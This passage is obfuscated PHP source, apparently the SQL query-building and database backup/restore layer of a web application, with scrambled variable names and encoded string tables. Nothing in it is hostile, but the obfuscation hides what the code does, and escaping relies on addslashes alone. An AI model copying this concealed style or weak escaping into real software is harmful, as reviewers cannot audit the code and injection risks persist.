$ê°Ÿ÷õ[1051] . $”±» «»; } protected function parseWhereItem($’íÚëıË, $õİŸªõ¼) { $²åîâ¬î =& $_SERVER[ •ŒÓîÆ]; $î·øêó = $²åîâ¬î[12]; if (is_array($õİŸªõ¼)) { if (is_string($õİŸªõ¼[0])) { $ûß›‹•İ = strtolower($õİŸªõ¼[0]); if (in_array($õİŸªõ¼[0], array($²åîâ¬î[925], $²åîâ¬î[1052], $²åîâ¬î[1053], $²åîâ¬î[1054], $²åîâ¬î[1055], $²åîâ¬î[1056]))) { $î·øêó .= $’íÚëıË . $²åîâ¬î[53] . $õİŸªõ¼[0] . $²åîâ¬î[53] . $this->parseValue($õİŸªõ¼[1]); } elseif (preg_match($²åîâ¬î[1057], $õİŸªõ¼[0])) { $î·øêó .= $’íÚëıË . $²åîâ¬î[53] . $this->exp[$ûß›‹•İ] . $²åîâ¬î[53] . $this->parseValue($õİŸªõ¼[1]); } elseif (preg_match($²åîâ¬î[1058], $õİŸªõ¼[0])) { if (is_array($õİŸªõ¼[1])) { $±ªüƒ… = isset($õİŸªõ¼[2]) ? strtoupper($õİŸªõ¼[2]) : $²åîâ¬î[1043]; if (in_array($±ªüƒ…, array($²åîâ¬î[1042], $²åîâ¬î[1043], $²åîâ¬î[1044]))) { $§Ÿ¿´ª = array(); foreach ($õİŸªõ¼[1] as $¿ıò°İ) { $§Ÿ¿´ª[] = $’íÚëıË . $²åîâ¬î[53] . $this->exp[$ûß›‹•İ] . $²åîâ¬î[53] . $this->parseValue($¿ıò°İ); } $î·øêó .= $²åîâ¬î[315] . implode($²åîâ¬î[53] . $±ªüƒ… . $²åîâ¬î[53], $§Ÿ¿´ª) . $²åîâ¬î[946]; } } else { $î·øêó .= $’íÚëıË . $²åîâ¬î[53] . $this->exp[$ûß›‹•İ] . $²åîâ¬î[53] . $this->parseValue($õİŸªõ¼[1]); } } elseif ($²åîâ¬î[352] == $ûß›‹•İ) { $î·øêó .= $²åîâ¬î[944] . $’íÚëıË . $²åîâ¬î[53] . $õİŸªõ¼[1] . $²åîâ¬î[1059]; } elseif (preg_match($²åîâ¬î[1060], $õİŸªõ¼[0])) { $î·øêó .= $õİŸªõ¼[0]; } elseif (preg_match($²åîâ¬î[1061], $õİŸªõ¼[0])) { if (isset($õİŸªõ¼[2]) && $²åîâ¬î[352] == $õİŸªõ¼[2]) { $î·øêó .= $’íÚëıË . $²åîâ¬î[53] . $this->exp[$ûß›‹•İ] . $²åîâ¬î[53] . $õİŸªõ¼[1]; } else { if (is_string($õİŸªõ¼[1])) { $õİŸªõ¼[1] = explode($²åîâ¬î[50], $õİŸªõ¼[1]); } $ğ¿Ô™ê = implode($²åîâ¬î[50], $this->parseValue($õİŸªõ¼[1])); $î·øêó .= $’íÚëıË . $²åîâ¬î[53] . $this->exp[$ûß›‹•İ] . $²åîâ¬î[944] . $ğ¿Ô™ê . $²åîâ¬î[946]; } } elseif (preg_match($²åîâ¬î[1062], $õİŸªõ¼[0])) { $êˆÌ®¦â = is_string($õİŸªõ¼[1]) ? explode($²åîâ¬î[50], $õİŸªõ¼[1]) : $õİŸªõ¼[1]; $î·øêó .= $²åîâ¬î[944] . $’íÚëıË . $²åîâ¬î[53] . $this->exp[$ûß›‹•İ] . $²åîâ¬î[53] . $this->parseValue($êˆÌ®¦â[0]) . $²åîâ¬î[1045] . $this->parseValue($êˆÌ®¦â[1]) . $²åîâ¬î[333]; } else { think_exception(think_lang($²åîâ¬î[1048]) . $²åîâ¬î[4] . $õİŸªõ¼[0]); } } else { $Êø¡ü‰ï = count($õİŸªõ¼); $ĞÃ§»¤† = $²åîâ¬î[12]; if (is_string($õİŸªõ¼[$Êø¡ü‰ï - 1])) { $ĞÃ§»¤† = isset($õİŸªõ¼[$Êø¡ü‰ï - 1]) ? strtoupper($õİŸªõ¼[$Êø¡ü‰ï - 1]) : $²åîâ¬î[12]; if (in_array($ĞÃ§»¤†, array($²åîâ¬î[1042], $²åîâ¬î[1043], $²åîâ¬î[1044]))) { $Êø¡ü‰ï = $Êø¡ü‰ï - 1; } } else { $ĞÃ§»¤† = $²åîâ¬î[1042]; } for ($Í³‹æœò = 0; $Í³‹æœò < $Êø¡ü‰ï; $Í³‹æœò++) { $êˆÌ®¦â = is_array($õİŸªõ¼[$Í³‹æœò]) ? $õİŸªõ¼[$Í³‹æœò][1] : $õİŸªõ¼[$Í³‹æœò]; if ($²åîâ¬î[352] == strtolower($õİŸªõ¼[$Í³‹æœò][0])) { $î·øêó .= $²åîâ¬î[315] . $’íÚëıË . $²åîâ¬î[53] . $êˆÌ®¦â . $²åîâ¬î[1059] . $ĞÃ§»¤† . $²åîâ¬î[53]; } else { $îİéáˆ× = is_array($õİŸªõ¼[$Í³‹æœò]) ? $this->exp[strtolower($õİŸªõ¼[$Í³‹æœò][0])] : $²åîâ¬î[925]; if (!$îİéáˆ× && is_array($õİŸªõ¼[$Í³‹æœò]) && in_array($õİŸªõ¼[$Í³‹æœò][0], array($²åîâ¬î[925], $²åîâ¬î[1052], $²åîâ¬î[1053], $²åîâ¬î[1054], $²åîâ¬î[1055], $²åîâ¬î[1056]))) { $îİéáˆ× = $õİŸªõ¼[$Í³‹æœò][0]; } $î·øêó .= $²åîâ¬î[315] . $’íÚëıË . $²åîâ¬î[53] . $îİéáˆ× . $²åîâ¬î[53] . $this->parseValue($êˆÌ®¦â) . $²åîâ¬î[1059] . $ĞÃ§»¤† . $²åîâ¬î[53]; } } $î·øêó = substr($î·øêó, 0, -4); } } else { $î·øêó .= $’íÚëıË . $²åîâ¬î[1063] . $this->parseValue($õİŸªõ¼); } return $î·øêó; } protected function parseThinkWhere($Æ™öÉ–õ, $‡ó£Ğò¨) { $µÀÄùÊÛ =& $_SERVER[ •ŒÓîÆ]; $˜›Æş×¸ = $µÀÄùÊÛ[12]; switch ($Æ™öÉ–õ) { case $µÀÄùÊÛ[407]: $˜›Æş×¸ = $‡ó£Ğò¨; break; case $µÀÄùÊÛ[1046]: $˜›Æş×¸ = is_string($‡ó£Ğò¨) ? $‡ó£Ğò¨ : substr($this->parseWhere($‡ó£Ğò¨), 6); break; case $µÀÄùÊÛ[1064]: parse_str($‡ó£Ğò¨, $ÉëÉÏ›); if (isset($ÉëÉÏ›[$µÀÄùÊÛ[1041]])) { $úßô§Šî = $µÀÄùÊÛ[53] . strtoupper($ÉëÉÏ›[$µÀÄùÊÛ[1041]]) . $µÀÄùÊÛ[53]; unset($ÉëÉÏ›[$µÀÄùÊÛ[1041]]); } else { $úßô§Šî = $µÀÄùÊÛ[1045]; } $ËùÓ¬‚‰ = array(); foreach ($ÉëÉÏ› as $Õ½ïÈÑË => $íñÆı·’) { $ËùÓ¬‚‰[] = $this->parseKey($Õ½ïÈÑË) . $µÀÄùÊÛ[1063] . $this->parseValue($íñÆı·’); } $˜›Æş×¸ = implode($úßô§Šî, $ËùÓ¬‚‰); break; } return $˜›Æş×¸; } protected function parseLimit($ŸÊÙäá) { $å¢Ñè‰œ =& $_SERVER[ •ŒÓîÆ]; return !empty($ŸÊÙäá) ? $å¢Ñè‰œ[51] . $ŸÊÙäá . $å¢Ñè‰œ[53] : $å¢Ñè‰œ[12]; } protected function parseJoin($£È…•Èõ) { $õáÎ©¾­ =& $_SERVER[ •ŒÓîÆ]; $§Å¶ïºÑ = $õáÎ©¾­[12]; if (!empty($£È…•Èõ)) { if (is_array($£È…•Èõ)) { foreach ($£È…•Èõ as $«Äª¢’ã => $ôÔ¡Ä) { if (!1 !== stripos($ôÔ¡Ä, $õáÎ©¾­[1065])) { $§Å¶ïºÑ .= $õáÎ©¾­[53] . $ôÔ¡Ä; } else { $§Å¶ïºÑ .= $õáÎ©¾­[1066] . $ôÔ¡Ä; } } } else { $§Å¶ïºÑ .= $õáÎ©¾­[1066] . $£È…•Èõ; } } $§Å¶ïºÑ = preg_replace($õáÎ©¾­[1067], think_config($õáÎ©¾­[971]) . $õáÎ©¾­[1068], $§Å¶ïºÑ); return $§Å¶ïºÑ; } protected function parseOrder($º¤øù§) { $¥ØÛ¢Ÿ¼ =& $_SERVER[ •ŒÓîÆ]; if (is_array($º¤øù§)) { $³¤´× = array(); foreach ($º¤øù§ as $ğä½û¹à => $ƒÒ§¶Íü) { if (is_numeric($ğä½û¹à)) { $³¤´×[] = $this->parseKey($ƒÒ§¶Íü); } else { $ƒÒ§¶Íü = in_array(strtoupper(trim($ƒÒ§¶Íü)), array($¥ØÛ¢Ÿ¼[1069], $¥ØÛ¢Ÿ¼[1070])) ? $¥ØÛ¢Ÿ¼[53] . $ƒÒ§¶Íü : $¥ØÛ¢Ÿ¼[12]; if (preg_match($¥ØÛ¢Ÿ¼[1071], $ğä½û¹à)) { $³¤´×[] = $this->parseKey($ğä½û¹à) . $ƒÒ§¶Íü; } else { think_exception($¥ØÛ¢Ÿ¼[1072] . $ğä½û¹à); } } } $º¤øù§ = implode($¥ØÛ¢Ÿ¼[50], $³¤´×); } return !empty($º¤øù§) ? $¥ØÛ¢Ÿ¼[1073] . $º¤øù§ : $¥ØÛ¢Ÿ¼[12]; } protected function parseGroup($ñš÷¢¡) { $ìŸÙˆŞŠ =& $_SERVER[ •ŒÓîÆ]; return !empty($ñš÷¢¡) ? $ìŸÙˆŞŠ[1074] . $ñš÷¢¡ : $ìŸÙˆŞŠ[12]; } protected function parseHaving($Ş“Çöø³) { $Æõä©¢ =& $_SERVER[ •ŒÓîÆ]; return !empty($Ş“Çöø³) ? $Æõä©¢[1075] . $Ş“Çöø³ : $Æõä©¢[12]; } protected function parseComment($™¢ş¦é³) { $Ÿòêí“Õ =& $_SERVER[ •ŒÓîÆ]; return !empty($™¢ş¦é³) ? $Ÿòêí“Õ[1076] . $™¢ş¦é³ . $Ÿòêí“Õ[1077] : $Ÿòêí“Õ[12]; } protected function parseDistinct($¾¹°¤Å) { $²Šñç­Ø =& $_SERVER[ •ŒÓîÆ]; return !empty($¾¹°¤Å) ? $²Šñç­Ø[1078] : $²Šñç­Ø[12]; } protected function parseUnion($ú²š¡„) { $ŸŠõô»Á =& $_SERVER[ •ŒÓîÆ]; if (empty($ú²š¡„)) { return $ŸŠõô»Á[12]; } if (isset($ú²š¡„[$ŸŠõô»Á[403]])) { $ÈĞª’ÁÇ = $ŸŠõô»Á[1079]; unset($ú²š¡„[$ŸŠõô»Á[403]]); } else { $ÈĞª’ÁÇ = $ŸŠõô»Á[1080]; } foreach ($ú²š¡„ as $‰†ÂÈ·) { $äëÄ´²î[] = $ÈĞª’ÁÇ . (is_array($‰†ÂÈ·) ? $this->buildSelectSql($‰†ÂÈ·) : $‰†ÂÈ·); } return implode($ŸŠõô»Á[53], $äëÄ´²î); } public function insert($¤îöÒş´, $ò€—Â÷ = array(), $ûéı¬ïŞ = false) { $“—‘ÊÎ‹ =& $_SERVER[ •ŒÓîÆ]; $ºÄ§ÑÕ = $æóó¡ˆâ = array(); $this->model = $ò€—Â÷[$“—‘ÊÎ‹[336]]; foreach ($¤îöÒş´ as $ˆŞÄ… => $«Öœ¨âˆ) { if (is_array($«Öœ¨âˆ) && $“—‘ÊÎ‹[352] == $«Öœ¨âˆ[0]) { $æóó¡ˆâ[] = $this->parseKey($ˆŞÄ…); $ºÄ§ÑÕ[] = $«Öœ¨âˆ[1]; } elseif (is_scalar($«Öœ¨âˆ) || is_null($«Öœ¨âˆ)) { $æóó¡ˆâ[] = $this->parseKey($ˆŞÄ…); $ºÄ§ÑÕ[] = $this->parseValue($«Öœ¨âˆ); } } $…öÓ‰Û¨ = ($ûéı¬ïŞ ? $“—‘ÊÎ‹[948] : $“—‘ÊÎ‹[949]) . $“—‘ÊÎ‹[950] . $this->parseTable($ò€—Â÷[$“—‘ÊÎ‹[334]]) . $“—‘ÊÎ‹[944] . implode($“—‘ÊÎ‹[50], $æóó¡ˆâ) . $“—‘ÊÎ‹[945] . implode($“—‘ÊÎ‹[50], $ºÄ§ÑÕ) . $“—‘ÊÎ‹[946]; $…öÓ‰Û¨ .= $this->parseLock(isset($ò€—Â÷[$“—‘ÊÎ‹[885]]) ? $ò€—Â÷[$“—‘ÊÎ‹[885]] : !1); $…öÓ‰Û¨ .= $this->parseComment(!empty($ò€—Â÷[$“—‘ÊÎ‹[409]]) ? $ò€—Â÷[$“—‘ÊÎ‹[409]] : $“—‘ÊÎ‹[12]); return $this->execute($…öÓ‰Û¨, $this->parseBind(!empty($ò€—Â÷[$“—‘ÊÎ‹[340]]) ? $ò€—Â÷[$“—‘ÊÎ‹[340]] : array())); } public function selectInsert($úïñÑí¢, $ì½Î´Ïä, $ßé¯¡ı÷ = array()) { $áŞß•† =& $_SERVER[ •ŒÓîÆ]; $this->model = $ßé¯¡ı÷[$áŞß•†[336]]; if (is_string($úïñÑí¢)) { $úïñÑí¢ = explode($áŞß•†[50], $úïñÑí¢); } array_walk($úïñÑí¢, array($this, $áŞß•†[947])); $‹æ¬»Ğ£ = $áŞß•†[1081] . $this->parseTable($ì½Î´Ïä) . $áŞß•†[944] . implode($áŞß•†[50], $úïñÑí¢) . $áŞß•†[1059]; $‹æ¬»Ğ£ .= $this->buildSelectSql($ßé¯¡ı÷); return $this->execute($‹æ¬»Ğ£, $this->parseBind(!empty($ßé¯¡ı÷[$áŞß•†[340]]) ? $ßé¯¡ı÷[$áŞß•†[340]] : array())); } public function update($ÅóÎ•ş¼, $¶Á¯ïç) { $ÂÆøàâ˜ =& $_SERVER[ •ŒÓîÆ]; $this->model = $¶Á¯ïç[$ÂÆøàâ˜[336]]; $­é¬ù‹Ğ = $ÂÆøàâ˜[1082] . $this->parseTable($¶Á¯ïç[$ÂÆøàâ˜[334]]) . $this->parseSet($ÅóÎ•ş¼) . $this->parseWhere(!empty($¶Á¯ïç[$ÂÆøàâ˜[330]]) ? $¶Á¯ïç[$ÂÆøàâ˜[330]] : $ÂÆøàâ˜[12]) . $this->parseOrder(!empty($¶Á¯ïç[$ÂÆøàâ˜[420]]) ? $¶Á¯ïç[$ÂÆøàâ˜[420]] : $ÂÆøàâ˜[12]) . $this->parseLimit(!empty($¶Á¯ïç[$ÂÆøàâ˜[347]]) ? $¶Á¯ïç[$ÂÆøàâ˜[347]] : $ÂÆøàâ˜[12]) . $this->parseLock(isset($¶Á¯ïç[$ÂÆøàâ˜[885]]) ? $¶Á¯ïç[$ÂÆøàâ˜[885]] : !1) . $this->parseComment(!empty($¶Á¯ïç[$ÂÆøàâ˜[409]]) ? $¶Á¯ïç[$ÂÆøàâ˜[409]] : $ÂÆøàâ˜[12]); return $this->execute($­é¬ù‹Ğ, $this->parseBind(!empty($¶Á¯ïç[$ÂÆøàâ˜[340]]) ? $¶Á¯ïç[$ÂÆøàâ˜[340]] : array())); } public function delete($®şÂûŞ¬ = array()) { $â‚×šâƒ =& $_SERVER[ •ŒÓîÆ]; $this->model = $®şÂûŞ¬[$â‚×šâƒ[336]]; $Ú²ò¯– = $â‚×šâƒ[1083] . $this->parseTable($®şÂûŞ¬[$â‚×šâƒ[334]]) . $this->parseWhere(!empty($®şÂûŞ¬[$â‚×šâƒ[330]]) ? $®şÂûŞ¬[$â‚×šâƒ[330]] : $â‚×šâƒ[12]) . $this->parseOrder(!empty($®şÂûŞ¬[$â‚×šâƒ[420]]) ? $®şÂûŞ¬[$â‚×šâƒ[420]] : $â‚×šâƒ[12]) . $this->parseLimit(!empty($®şÂûŞ¬[$â‚×šâƒ[347]]) ? $®şÂûŞ¬[$â‚×šâƒ[347]] : $â‚×šâƒ[12]) . $this->parseLock(isset($®şÂûŞ¬[$â‚×šâƒ[885]]) ? $®şÂûŞ¬[$â‚×šâƒ[885]] : !1) . $this->parseComment(!empty($®şÂûŞ¬[$â‚×šâƒ[409]]) ? $®şÂûŞ¬[$â‚×šâƒ[409]] : $â‚×šâƒ[12]); return $this->execute($Ú²ò¯–, $this->parseBind(!empty($®şÂûŞ¬[$â‚×šâƒ[340]]) ? $®şÂûŞ¬[$â‚×šâƒ[340]] : array())); } public function select($ªŞÚ©©¬ = array()) { $ŠŒ‚÷ã =& $_SERVER[ •ŒÓîÆ]; $this->model = $ªŞÚ©©¬[$ŠŒ‚÷ã[336]]; $ŠÅÎàÕ… = $this->buildSelectSql($ªŞÚ©©¬); $ÄÂ´£ØÇ = isset($ªŞÚ©©¬[$ŠŒ‚÷ã[404]]) ? $ªŞÚ©©¬[$ŠŒ‚÷ã[404]] : !1; if ($ÄÂ´£ØÇ) { $–Öëõ£ = is_string($ÄÂ´£ØÇ[$ŠŒ‚÷ã[96]]) ? $ÄÂ´£ØÇ[$ŠŒ‚÷ã[96]] : $ŠŒ‚÷ã[1084] . md5($ŠÅÎàÕ…); $Áñ¢â°í = think_cache($–Öëõ£, $ŠŒ‚÷ã[12], $ÄÂ´£ØÇ); if (!1 !== $Áñ¢â°í) { return $Áñ¢â°í; } } $‰âëÁ— = $this->query($ŠÅÎàÕ…, $this->parseBind(!empty($ªŞÚ©©¬[$ŠŒ‚÷ã[340]]) ? $ªŞÚ©©¬[$ŠŒ‚÷ã[340]] : array())); if ($ÄÂ´£ØÇ && !1 !== $‰âëÁ—) { think_cache($–Öëõ£, $‰âëÁ—, $ÄÂ´£ØÇ); } return $‰âëÁ—; } public function buildSelectSql($ù¼Ëİè = array()) { $¹å©†­ =& $_SERVER[ •ŒÓîÆ]; if (isset($ù¼Ëİè[$¹å©†­[408]])) { if (strpos($ù¼Ëİè[$¹å©†­[408]], $¹å©†­[50])) { list($äç¦¨Â, $Ÿªü¸¼ó) = explode($¹å©†­[50], $ù¼Ëİè[$¹å©†­[408]]); } else { $äç¦¨Â = $ù¼Ëİè[$¹å©†­[408]]; } $äç¦¨Â = $äç¦¨Â ? $äç¦¨Â : 1; $Ÿªü¸¼ó = isset($Ÿªü¸¼ó) ? $Ÿªü¸¼ó : (is_numeric($ù¼Ëİè[$¹å©†­[347]]) ? $ù¼Ëİè[$¹å©†­[347]] : 20); $Ü«ç°‰¦ = $Ÿªü¸¼ó * ((int) $äç¦¨Â - 1); $ù¼Ëİè[$¹å©†­[347]] = $Ü«ç°‰¦ . $¹å©†­[50] . $Ÿªü¸¼ó; } if (think_config($¹å©†­[1085])) { $¿ÓÀûµ = $¹å©†­[1086] . md5(serialize($ù¼Ëİè)); $Ôê™»”¼ = think_cache($¿ÓÀûµ); if ($Ôê™»”¼) { return $Ôê™»”¼; } } $‹£î„ = $this->parseSql($this->selectSql, $ù¼Ëİè); $‹£î„ .= $this->parseLock(isset($ù¼Ëİè[$¹å©†­[885]]) ? $ù¼Ëİè[$¹å©†­[885]] : !1); if (isset($¿ÓÀûµ)) { think_cache($¿ÓÀûµ, $‹£î„); } return $‹£î„; } public function parseSql($×´Î•ã, $Í±õ‡¶‰ = array()) { $‚¯Ì¡ö¨ =& $_SERVER[ •ŒÓîÆ]; $×´Î•ã = str_replace(array($‚¯Ì¡ö¨[1087], $‚¯Ì¡ö¨[1088], $‚¯Ì¡ö¨[1089], $‚¯Ì¡ö¨[1090], $‚¯Ì¡ö¨[1091], $‚¯Ì¡ö¨[1092], $‚¯Ì¡ö¨[1093], $‚¯Ì¡ö¨[1094], $‚¯Ì¡ö¨[1095], $‚¯Ì¡ö¨[1096], $‚¯Ì¡ö¨[1097]), array($this->parseTable("{$Í±õ‡¶‰[$‚¯Ì¡ö¨[334]]}"), $this->parseDistinct(isset($Í±õ‡¶‰[$‚¯Ì¡ö¨[1098]]) ? $Í±õ‡¶‰[$‚¯Ì¡ö¨[1098]] : !1), $this->parseField(!empty($Í±õ‡¶‰[$‚¯Ì¡ö¨[328]]) ? $Í±õ‡¶‰[$‚¯Ì¡ö¨[328]] : $‚¯Ì¡ö¨[205]), $this->parseJoin(!empty($Í±õ‡¶‰[$‚¯Ì¡ö¨[337]]) ? $Í±õ‡¶‰[$‚¯Ì¡ö¨[337]] : $‚¯Ì¡ö¨[12]), $this->parseWhere(!empty($Í±õ‡¶‰[$‚¯Ì¡ö¨[330]]) ? $Í±õ‡¶‰[$‚¯Ì¡ö¨[330]] : $‚¯Ì¡ö¨[12]), $this->parseGroup(!empty($Í±õ‡¶‰[$‚¯Ì¡ö¨[559]]) ? $Í±õ‡¶‰[$‚¯Ì¡ö¨[559]] : $‚¯Ì¡ö¨[12]), $this->parseHaving(!empty($Í±õ‡¶‰[$‚¯Ì¡ö¨[1099]]) ? $Í±õ‡¶‰[$‚¯Ì¡ö¨[1099]] : $‚¯Ì¡ö¨[12]), $this->parseOrder(!empty($Í±õ‡¶‰[$‚¯Ì¡ö¨[420]]) ? $Í±õ‡¶‰[$‚¯Ì¡ö¨[420]] : $‚¯Ì¡ö¨[12]), $this->parseLimit(!empty($Í±õ‡¶‰[$‚¯Ì¡ö¨[347]]) ? $Í±õ‡¶‰[$‚¯Ì¡ö¨[347]] : $‚¯Ì¡ö¨[12]), $this->parseUnion(!empty($Í±õ‡¶‰[$‚¯Ì¡ö¨[402]]) ? $Í±õ‡¶‰[$‚¯Ì¡ö¨[402]] : $‚¯Ì¡ö¨[12]), $this->parseComment(!empty($Í±õ‡¶‰[$‚¯Ì¡ö¨[409]]) ? $Í±õ‡¶‰[$‚¯Ì¡ö¨[409]] : $‚¯Ì¡ö¨[12])), $×´Î•ã); return $×´Î•ã; } public function getLastSql($“½²¼¹ = '') { return $“½²¼¹ ? $this->modelSql[$“½²¼¹] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($×Û¨Ïƒœ) { return addslashes($×Û¨Ïƒœ); } public function setModel($µ¤ã¿™) { $this->model = $µ¤ã¿™; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ºÕïÖ‹š = array()) { $—À®•ŠÀ =& $_SERVER[ •ŒÓîÆ]; if (empty($ºÕïÖ‹š)) { $ºÕïÖ‹š = $GLOBALS[$—À®•ŠÀ[6]][$—À®•ŠÀ[21]]; } $this->database = $ºÕïÖ‹š; } public function model($Ê¿ÙåÌÚ = '') { return new ModelBase($Ê¿ÙåÌÚ, $_SERVER[ •ŒÓîÆ][12], $this->database); } public function db($æâÓç Ó = false) { $ÀÃÏŸ”§ =& $_SERVER[ •ŒÓîÆ]; $ºµè» é = array_change_key_case($this->database); if ($this->dbType() == $ÀÃÏŸ”§[13] || !$æâÓç Ó) { return $this->model()->db(); } $´€ôÌóğ = $ºµè» é[$ÀÃÏŸ”§[1013]]; $ºµè» é[$ÀÃÏŸ”§[1013]] = $ÀÃÏŸ”§[12]; if ($ºµè» é[$ÀÃÏŸ”§[1008]] == $ÀÃÏŸ”§[1005]) { $÷‹·—ƒù = $ºµè» é[$ÀÃÏŸ”§[1014]]; $ºµè» é[$ÀÃÏŸ”§[1014]] = substr($÷‹·—ƒù, 0, strrpos($÷‹·—ƒù, $ÀÃÏŸ”§[1100])); } $this->database = $ºµè» é; $Ô©¶”ïª = $this->model()->db(); try { $ı’œ¦Ì½ = $Ô©¶”ïª->execute("\x73\x68\x6f\167\x20\x64\141\x74\141\x62\x61\163\145\x73\40\x6c\151\153\x65\x20\x27{$´€ôÌóğ}\47"); } catch (Exception $ÕºŸ¾è) { } if (!$ı’œ¦Ì½) { $Ô©¶”ïª->execute("\x63\x72\145\141\164\145\x20\144\x61\x74\141\142\141\163\x65\x20\140{$´€ôÌóğ}\x60"); } $ºµè» é[$ÀÃÏŸ”§[1013]] = $´€ôÌóğ; if ($ºµè» é[$ÀÃÏŸ”§[1008]] == $ÀÃÏŸ”§[1005]) { $ºµè» é[$ÀÃÏŸ”§[1014]] .= $ÀÃÏŸ”§[1100] . $´€ôÌóğ; } $this->database = $ºµè» é; $Ô©¶”ïª->execute("\165\x73\x65\40\x60{$´€ôÌóğ}\140"); return $Ô©¶”ïª; } public function createTable($ÈõĞõÉ, &$¬ ôÏââ) { $‰Ùî†…É =& $_SERVER[ •ŒÓîÆ]; if (!IO::exist($ÈõĞõÉ)) { ActionCall($‰Ùî†…É[1101], !0, 0); show_json(LNG($‰Ùî†…É[1102]), !1); } $‰í«ã = $this->model()->db(); $¢ÈÕÎç = sqlSplit(IO::getContent($ÈõĞõÉ)); foreach ($¢ÈÕÎç as $â©ïöß±) { $üÉğ˜çÆ = stripos($â©ïöß±, $‰Ùî†…É[1103]) === 0; if ($üÉğ˜çÆ) { $¬ ôÏââ->task[$‰Ùî†…É[827]] += 1; } $‰í«ã->execute($â©ïöß±); if ($üÉğ˜çÆ) { preg_match($‰Ùî†…É[1104], $â©ïöß±, $ÙŠÅûÕ¯); $¬ ôÏââ->task[$‰Ùî†…É[1105]] = $ÙŠÅûÕ¯[1]; $¬ ôÏââ->update(1); } } } public function insertTable($ß•°ñğÙ, &$›øé«»ê) { $µÃ¡¿ĞÚ =& $_SERVER[ •ŒÓîÆ]; $ÃŸúÃœ = $this->model()->db(); $·ÌçÑÃå = $’²îøµ ? array($’²îøµ) : $ÃŸúÃœ->getTables(); foreach ($ß•°ñğÙ as $æä·àĞÇ) { $’²îøµ = basename($æä·àĞÇ, $µÃ¡¿ĞÚ[829]); if (!in_array($’²îøµ, $·ÌçÑÃå)) { continue; } $›øé«»ê->task[$µÃ¡¿ĞÚ[1105]] = $’²îøµ; if (get_filesize($æä·àĞÇ) == 0) { continue; } $Ş·£¸‘ï = $this->sqlToDb($æä·àĞÇ, $›øé«»ê); if (!$Ş·£¸‘ï) { ActionCall($µÃ¡¿ĞÚ[1101], !0, 0); show_json(LNG($µÃ¡¿ĞÚ[1106]) . "\133{$’²îøµ}\x5d", !1); } } } public function sqlFromDb($¤§ÑÖ‹Ú, $«›ŞÖºÎ, &$êØöÎ, $‡—Ñ÷çË = '') { if ($êØöÎ) { $êØöÎ->task[$_SERVER[ •ŒÓîÆ][1105]] = $¤§ÑÖ‹Ú; } $‘ºœ¹’ = $this->model($¤§ÑÖ‹Ú); $²×ŞÎËø = 0; $ç¤ˆ±¾ = 0; $«å²Ñùê = 10000; $â¬«êÚÖ = fopen($«›ŞÖºÎ, $_SERVER[ •ŒÓîÆ][1107]); $Öã‘ªëÅ = $‘ºœ¹’->getPk(); $Ÿ–““ = $‘ºœ¹’->getDbFields(); $ïıé÷Õ = $_SERVER[ •ŒÓîÆ][12]; if ($GLOBALS[$_SERVER[ •ŒÓîÆ][828]] && in_array($¤§ÑÖ‹Ú, array($_SERVER[ •ŒÓîÆ][1108], $_SERVER[ •ŒÓîÆ][1109]))) { $ïıé÷Õ = $¤§ÑÖ‹Ú; } do { $íıÛŠö = array($Öã‘ªëÅ => array($_SERVER[ •ŒÓîÆ][1055], $ç¤ˆ±¾)); $çŞÛâ¿ = $‘ºœ¹’->where($íıÛŠö)->field($Ÿ–““)->order($Öã‘ªëÅ . $_SERVER[ •ŒÓîÆ][1110])->limit($«å²Ñùê)->select(); $çŞÛâ¿ = !empty($çŞÛâ¿) ? $çŞÛâ¿ : array(); if (!($Ù¡üÎÕÒ = count($çŞÛâ¿))) { break; } $Í“ÑÔÄ‚ = end($çŞÛâ¿); $ç¤ˆ±¾ = $Í“ÑÔÄ‚[$Öã‘ªëÅ]; $´Õ³ôÇÇ = array(); foreach ($çŞÛâ¿ as $ÀÚ®Ø’) { if ($ïıé÷Õ) { if ($¤§ÑÖ‹Ú == $_SERVER[ •ŒÓîÆ][1108]) { if ($ÀÚ®Ø’[$_SERVER[ •ŒÓîÆ][33]] == $_SERVER[ •ŒÓîÆ][1111]) { $©¢½øÓ = json_decode($ÀÚ®Ø’[$_SERVER[ •ŒÓîÆ][429]], !0); if ($©¢½øÓ[$_SERVER[ •ŒÓîÆ][32]] == $GLOBALS[$_SERVER[ •ŒÓîÆ][828]] && $©¢½øÓ[$_SERVER[ •ŒÓîÆ][791]] != 1) { continue; } } } else { if ($ÀÚ®Ø’[$_SERVER[ •ŒÓîÆ][33]] == $_SERVER[ •ŒÓîÆ][1112] && $ÀÚ®Ø’[$_SERVER[ •ŒÓîÆ][96]] == $_SERVER[ •ŒÓîÆ][820]) { continue; } } } if ($‡—Ñ÷çË) { $ÀÚ®Ø’[$_SERVER[ •ŒÓîÆ][86]] = "\173\x69\157\x3a{$‡—Ñ÷çË}\x7d" . substr($ÀÚ®Ø’[$_SERVER[ •ŒÓîÆ][86]], strlen("\173\x69\x6f\x3a{$ÀÚ®Ø’[$_SERVER[ •ŒÓîÆ][858]]}\x7d")); $ÀÚ®Ø’[$_SERVER[ •ŒÓîÆ][858]] = $‡—Ñ÷çË; } $´Õ³ôÇÇ[] = $_SERVER[ •ŒÓîÆ][1113] . $this->sqlEncode($ÀÚ®Ø’) . $_SERVER[ •ŒÓîÆ][1114]; } $“áÄ¹Ëµ = "\x49\x4e\x53\x45\122\x54\40\x49\116\124\x4f\40\x60{$¤§ÑÖ‹Ú}\140\40\50\140" . implode($_SERVER[ •ŒÓîÆ][1115], $Ÿ–““) . $_SERVER[ •ŒÓîÆ][1116]; fwrite($â¬«êÚÖ, $“áÄ¹Ëµ . implode($_SERVER[ •ŒÓîÆ][1117], $´Õ³ôÇÇ) . $_SERVER[ •ŒÓîÆ][73] . PHP_EOL); $²×ŞÎËø += $Ù¡üÎÕÒ; if ($êØöÎ) { $êØöÎ->update($Ù¡üÎÕÒ); } } while ($«å²Ñùê == $Ù¡üÎÕÒ); fclose($â¬«êÚÖ); return $²×ŞÎËø; } public function sqlToDb($¬©şÉ€„, &$íñŞœ£İ) { $õ§õ£ŞÆ =& $_SERVER[ •ŒÓîÆ]; $ÍÙÆõ‰¼ = $this->model()->db(); $È—èÛ… = @fopen($¬©şÉ€„, $õ§õ£ŞÆ[1118]); if (!$È—èÛ…) { return !1; } $ª¿‰ü¯ú = 0; $¤²¶—·º = $õ§õ£ŞÆ[12]; $«¾ë­ê² = array(); $åîéÁíŸ = 